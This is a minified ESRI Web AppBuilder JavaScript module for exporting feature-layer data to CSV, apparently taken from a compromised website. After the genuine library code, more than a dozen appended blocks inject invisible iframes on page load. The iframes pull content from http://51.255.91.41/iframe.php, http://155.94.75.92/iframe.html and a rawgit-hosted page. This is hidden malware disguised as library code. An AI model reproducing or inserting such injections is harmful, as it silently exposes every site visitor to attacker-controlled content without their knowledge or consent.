// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("exports dojo/_base/lang dojo/_base/array dojo/_base/html dojo/has dojo/Deferred jimu/utils esri/lang esri/tasks/QueryTask esri/tasks/query".split(" "),function(f,t,m,w,u,r,p,y,z,A){function x(b){var c=t.clone(b.attributes);(b=b.geometry)&&"point"===b.type&&("x"in c?c._x=b.x:c.x=b.x,"y"in c?c._y=b.y:c.y=b.y);return c}f.exportCSV=function(b,c,a,d,k){return f._createCSVStr(c,a,d,k).then(function(a){return f._download(b+".csv",a)})};f.exportCalculatedResultsCSV=function(b,c){var a="",d=0;m.forEach(c,
function(k){a+=k.name+" ("+k.type+")\r\n";f._createCSVStr([],[],k.appendColumns,k.appendDatas).then(function(e){a+=e;d++;if(d===c.length)return f._download(b+".csv",a);a+="\r\n\r\n"})})};f.exportCSVFromFeatureLayer=function(b,c,a){a=a||{};return f._getExportData(c,{datas:a.datas,fromClient:a.fromClient,withGeometry:a.withGeometry,outFields:a.outFields,filterExpression:a.filterExpression}).then(function(d){return f._formattedData(c,d,{formatNumber:a.formatNumber,formatDate:a.formatDate,formatCodedValue:a.formatCodedValue,
popupInfo:a.popupInfo,appendColumns:a.appendColumns,appendDatas:a.appendDatas}).then(function(a){return f.exportCSV(b,a.datas,a.columns,a.appendColumns,a.appendDatas)})})};f.exportCSVByAttributes=function(b,c,a,d){d=t.mixin({},d);d.datas=a;return f.exportCSVFromFeatureLayer(b,c,d)};f.exportCSVByGraphics=function(b,c,a,d){a=m.map(a,function(a){return a.attributes});return f.exportCSVByAttributes(b,c,a,d)};f._createCSVStr=function(b,c,a,d){var f=new r,e="",g=0,q=0,h="",l="";try{if(c&&0<c.length){m.forEach(c,
function(a){e=e+h+a;h=","});for(var e=e+"\r\n",g=b.length,q=c.length,n=0;n<g;n++){for(var h="",v=0;v<q;v++)(l=b[n][c[v]])||"number"===typeof l||(l=""),l&&/[",\r\n]/g.test(l)&&(l='"'+l.replace(/(")/g,'""')+'"'),e=e+h+l,h=",";e+="\r\n"}}"undefined"!==typeof a&&"undefined"!==typeof d&&0<a.length&&0<d.length&&(h="",m.forEach(a,function(a){e=e+h+a;h=","}),h="",e+="\r\n",m.forEach(d,function(a){Array.isArray(a)?(m.forEach(a,function(a){e=e+h+a;h=","}),h="",e+="\r\n"):(e=e+h+a,h=",")}));f.resolve(e)}catch(B){console.error(B),
f.resolve("")}return f};f._isIE11=function(){return 11===p.has("ie")};f._isEdge=function(){return p.has("edge")};f._getDownloadUrl=function(b){return window.Blob&&window.URL&&window.URL.createObjectURL?(b=new Blob(["\ufeff"+b],{type:"text/csv"}),URL.createObjectURL(b)):"data:attachment/csv;charset\x3dutf-8,\ufeff"+encodeURIComponent(b)};f._download=function(b,c){var a=new r;try{if(u("ie")&&10>u("ie")){var d=window.top.open("about:blank","_blank");d.document.write("sep\x3d,\r\n"+c);d.document.close();
d.document.execCommand("SaveAs",!0,b);d.close()}else if(10===u("ie")||f._isIE11()||f._isEdge()){var k=new Blob(["\ufeff"+c],{type:"text/csv"});navigator.msSaveBlob(k,b)}else{var e=w.create("a",{href:f._getDownloadUrl(c),target:"_blank",download:b},document.body);if(u("safari")){var g=document.createEvent("MouseEvents");g.initEvent("click",!0,!0);e.dispatchEvent(g)}else e.click();w.destroy(e)}a.resolve()}catch(q){a.reject(q)}return a};f._getExportData=function(b,c){var a=new r,d=null,k=c.datas,e=c.withGeometry,
d=c.outFields;d&&d.length||(d=b.fields);d=t.clone(d);if(e&&!(k&&0<k.length)){var g="",g=-1!==d.indexOf("x")?"_x":"x";d.push({name:g,alias:g,format:{digitSeparator:!1,places:6},show:!0,type:"esriFieldTypeDouble"});g=-1!==d.indexOf("y")?"_y":"y";d.push({name:g,alias:g,format:{digitSeparator:!1,places:6},show:!0,type:"esriFieldTypeDouble"})}k&&0<k.length?a.resolve({data:k||[],outFields:d}):c.fromClient?(k=m.map(b.graphics,function(a){return e?x(a):t.clone(a)}),a.resolve({data:k||[],outFields:d})):f._getExportDataFromServer(b,
d,c).then(function(b){a.resolve({data:b||[],outFields:d})});return a};f._getExportDataFromServer=function(b,c,a){var d=new r;if("esri.layers.FeatureLayer"!==b.declaredClass)return d.resolve([]),d;var f=new z(b.url),e=new A;e.where=a.filterExpression||b.getDefinitionExpression&&b.getDefinitionExpression()||"1\x3d1";0<c.length?(b=m.map(c,function(a){return a.name}),e.outFields=b):e.outFields=["*"];e.returnGeometry=a.withGeometry;f.execute(e,function(a){a=m.map(a.features,function(a){return x(a)});d.resolve(a)},
function(a){console.error(a);d.resolve([])});return d};f._formattedData=function(b,c,a){var d=new r,k=[],e=c.data;c=c.outFields;for(var g=0,q=e.length;g<q;g++){for(var h={},l=0;l<c.length;l++){var n=c[l];h[n.alias||n.name]=f._getExportValue(e[g][n.name],n,b.objectIdField,b.typeIdField,e[g][b.typeIdField],b.types,a)}k.push(h)}b=m.map(c,function(a){return a.alias||a.name});d.resolve({datas:k,columns:b,appendColumns:a.appendColumns,appendDatas:a.appendDatas});return d};f._getExportValue=function(b,c,
a,d,f,e,g){function k(a){if(h&&y.isDefined(h.fieldInfos))for(var b=0,c=h.fieldInfos.length;b<c;b++){var d=h.fieldInfos[b];if(d.fieldName===a)return d.format}return null}var h=g.popupInfo,l=!!c.domain&&g.formatCodedValue;g="esriFieldTypeDate"===c.type&&g.formatDate;var n=a&&c.name===a;d=d&&c.name===d;return g?p.fieldFormatter.getFormattedDate(b,k(c.name)):d?p.fieldFormatter.getTypeName(b,e):l?p.fieldFormatter.getCodedValue(c.domain,b):l||g||n||d?b:(l=null,a&&e&&0<e.length&&(a=(a=m.filter(e,function(a){return a.id===
f}))&&a[0])&&a.domains&&a.domains[c.name]&&a.domains[c.name].codedValues&&(l=p.fieldFormatter.getCodedValue(a.domains[c.name],b)),null!==l?l:b)}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});